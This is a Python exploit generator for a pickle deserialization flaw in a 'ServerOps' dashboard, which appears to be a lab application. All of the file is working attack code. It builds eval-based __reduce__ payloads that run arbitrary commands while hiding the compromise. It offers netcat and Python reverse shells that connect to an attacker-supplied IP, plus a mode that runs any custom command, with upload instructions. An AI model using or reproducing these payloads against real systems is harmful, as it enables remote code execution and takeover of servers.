#!/usr/bin/env python3
"""
Exploit Generator for ServerOps Pickle Deserialization Vulnerability

This tool generates malicious pickle payloads that exploit the insecure
deserialization vulnerability in the ServerOps application.

WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Unauthorized access to computer systems is illegal.
Only use this tool in controlled lab environments with explicit permission.

The exploit works by abusing Python's __reduce__ method, which is called
during the unpickling process. By returning a tuple of (callable, args),
we can execute arbitrary code when the pickle is loaded.
"""

import pickle
import base64
import os
import sys
from datetime import datetime


class RCE:
    """
    Remote Code Execution payload class.
    
    When this object is unpickled, the __reduce__ method is called,
    which returns a callable and args that execute arbitrary code.
    
    We use eval() to run the command AND return a valid empty list,
    so the application continues working (stealth mode).
    """
    
    def __init__(self, command: str):
        self.command = command
    
    def __reduce__(self):
        """
        Called during unpickling. Uses eval to:
        1. Execute the command via os.system()
        2. Return an empty list so the app doesn't break
        
        The expression: __import__('os').system('cmd') or []
        - Runs the command (returns 0 on success)
        - 0 is falsy, so 'or []' returns []
        - The unpickled object becomes [] (empty list)
        """
        escaped_cmd = self.command.replace("\\", "\\\\").replace("'", "\\'")
        payload = f"__import__('os').system('{escaped_cmd}') or []"
        return (eval, (payload,))


class RCESubprocess:
    """
    Alternative RCE using subprocess for more control.
    Returns empty list to keep the app working.
    """
    
    def __init__(self, command: str):
        self.command = command
    
    def __reduce__(self):
        escaped_cmd = self.command.replace("\\", "\\\\").replace("'", "\\'")
        payload = f"__import__('subprocess').call('{escaped_cmd}', shell=True) or []"
        return (eval, (payload,))


class RCEPythonFile:
    """
    RCE payload that creates a proof file using Python's file I/O.
    Avoids shell escaping issues by using pure Python.
    Shows a Windows message box to confirm exploitation.
    """
    
    def __reduce__(self):
        # Use eval with exec inside to run Python code and return []
        # Creates proof file on Desktop AND shows a popup message
        payload = (
            "[exec(\""
            "import os\\n"
            "import ctypes\\n"
            "p=os.path.join(os.path.expanduser('~'),'Desktop','PWNED.txt')\\n"
            "open(p,'w').write('PWNED BY PICKLE DESERIALIZATION RCE!\\\\n\\\\nThis file proves arbitrary code execution on the server.')\\n"
            "ctypes.windll.user32.MessageBoxW(0,'You have been PWNED!\\\\n\\\\nA proof file has been created at:\\\\n' + p,'RCE Exploit Successful',0x30)\\n"
            "\"), []][1]"
        )
        return (eval, (payload,))


def generate_python_file_payload(output_file: str) -> bytes:
    """Generate a payload that creates a proof file using Python."""
    malicious_obj = RCEPythonFile()
    pickled_data = pickle.dumps(malicious_obj)
    encoded_payload = base64.b64encode(pickled_data)
    
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    with open(output_file, 'wb') as f:
        f.write(encoded_payload)
    print(f"[+] Payload saved to: {output_file}")
    
    return encoded_payload


def generate_payload(command: str, output_file: str = None) -> bytes:
    """
    Generate a malicious pickle payload.
    
    Args:
        command: The shell command to execute on the target
        output_file: Optional file path to save the payload
    
    Returns:
        Base64 encoded malicious pickle data
    """
    malicious_obj = RCE(command)
    pickled_data = pickle.dumps(malicious_obj)
    encoded_payload = base64.b64encode(pickled_data)
    
    if output_file:
        with open(output_file, 'wb') as f:
            f.write(encoded_payload)
        print(f"[+] Payload saved to: {output_file}")
    
    return encoded_payload


def print_banner():
    """Display the tool banner."""
    banner = """
╔══════════════════════════════════════════════════════════════════╗
║        ServerOps Exploit Generator - Pickle Deserialization      ║
║                    FOR EDUCATIONAL USE ONLY                      ║
╠══════════════════════════════════════════════════════════════════╣
║  This tool exploits CVE-like insecure deserialization in Python  ║
║  Target: ServerOps Dashboard /import endpoint                    ║
║  Method: __reduce__ method abuse in pickle module                ║
╚══════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def print_menu():
    """Display the payload selection menu."""
    menu = """
┌─────────────────────────────────────────────────────────────────┐
│                     SELECT PAYLOAD TYPE                         │
├─────────────────────────────────────────────────────────────────┤
│  [1] Windows - Open Calculator (calc.exe)                       │
│  [2] Windows - Create proof file (C:\\pwned.txt)                │
│  [3] Linux   - Create proof file (/tmp/pwned)                   │
│  [4] Linux   - Reverse Shell (netcat)                           │
│  [5] Cross   - Python reverse shell                             │
│  [6] Custom  - Enter your own command                           │
│  [0] Exit                                                        │
└─────────────────────────────────────────────────────────────────┘
"""
    print(menu)


def get_reverse_shell_linux(ip: str, port: int) -> str:
    """Generate a netcat reverse shell command for Linux."""
    return f"nc -e /bin/sh {ip} {port}"


def get_reverse_shell_python(ip: str, port: int) -> str:
    """Generate a Python reverse shell command (cross-platform)."""
    return f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''


def interactive_mode():
    """Run the tool in interactive mode."""
    print_banner()
    
    while True:
        print_menu()
        choice = input("\n[>] Select option: ").strip()
        
        if choice == '0':
            print("\n[*] Exiting. Stay ethical!\n")
            break
        
        command = None
        payload_name = None
        
        if choice == '1':
            command = "calc.exe"
            payload_name = "windows_calc"
            print("\n[*] Selected: Windows Calculator")
            
        elif choice == '2':
            # Use Python to create the proof file directly - avoids shell escaping issues
            payload_name = "windows_proof"
            print("\n[*] Selected: Windows Proof of Concept (Python-based)")
            print(f"    [!] Proof file will be created on your Desktop: PWNED.txt")
            
            # Generate a special payload that uses Python's file I/O
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"payloads/malicious_{payload_name}_{timestamp}.ops"
            
            # Create custom RCE that writes file using Python
            payload = generate_python_file_payload(output_file)
            
            print(f"\n[+] Payload generated successfully!")
            print(f"[+] File: {output_file}")
            print(f"\n" + "="*65)
            print("  USAGE INSTRUCTIONS:")
            print("="*65)
            print("  1. Go to 'Import Config' in ServerOps")
            print(f"  2. Upload: {output_file}")
            print("  3. Check your Desktop for PWNED.txt!")
            print("="*65 + "\n")
            continue  # Skip the normal payload generation
            
        elif choice == '3':
            command = "touch /tmp/pwned && echo 'RCE Successful' > /tmp/pwned"
            payload_name = "linux_proof"
            print("\n[*] Selected: Linux Proof of Concept")
            
        elif choice == '4':
            print("\n[*] Reverse Shell Configuration:")
            ip = input("    Enter your IP address: ").strip()
            port = input("    Enter listening port [4444]: ").strip() or "4444"
            command = get_reverse_shell_linux(ip, int(port))
            payload_name = "linux_revshell"
            print(f"\n[!] Remember to start listener: nc -lvnp {port}")
            
        elif choice == '5':
            print("\n[*] Python Reverse Shell Configuration:")
            ip = input("    Enter your IP address: ").strip()
            port = input("    Enter listening port [4444]: ").strip() or "4444"
            command = get_reverse_shell_python(ip, int(port))
            payload_name = "python_revshell"
            print(f"\n[!] Remember to start listener: nc -lvnp {port}")
            
        elif choice == '6':
            print("\n[*] Custom Command Mode")
            command = input("    Enter command to execute: ").strip()
            payload_name = "custom"
            
        else:
            print("\n[!] Invalid option. Please try again.")
            continue
        
        if command:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"payloads/malicious_{payload_name}_{timestamp}.ops"
            
            print(f"\n[*] Generating payload...")
            print(f"[*] Command: {command}")
            
            payload = generate_payload(command, output_file)
            
            print(f"\n[+] Payload generated successfully!")
            print(f"[+] File: {output_file}")
            print(f"[+] Size: {len(payload)} bytes (base64)")
            print(f"\n[*] Base64 Preview (first 100 chars):")
            print(f"    {payload[:100].decode()}...")
            
            print("\n" + "="*65)
            print("  USAGE INSTRUCTIONS:")
            print("="*65)
            print("  1. Start the vulnerable ServerOps application")
            print("  2. Login with admin/admin")
            print("  3. Go to 'Import Config'")
            print(f"  4. Upload: {output_file}")
            print("  5. The command will execute on the server!")
            print("="*65 + "\n")


def cli_mode():
    """Run the tool in CLI mode with command-line arguments."""
    if len(sys.argv) < 2:
        print("Usage: python exploit_generator.py <command> [output_file]")
        print("Example: python exploit_generator.py 'calc.exe' payload.ops")
        sys.exit(1)
    
    command = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "payloads/malicious_payload.ops"
    
    print_banner()
    print(f"[*] Command: {command}")
    print(f"[*] Output:  {output_file}")
    
    payload = generate_payload(command, output_file)
    
    print(f"\n[+] Payload generated!")
    print(f"[+] Base64: {payload[:50].decode()}...")


if __name__ == "__main__":
    os.makedirs("payloads", exist_ok=True)
    
    if len(sys.argv) > 1:
        cli_mode()
    else:
        interactive_mode()
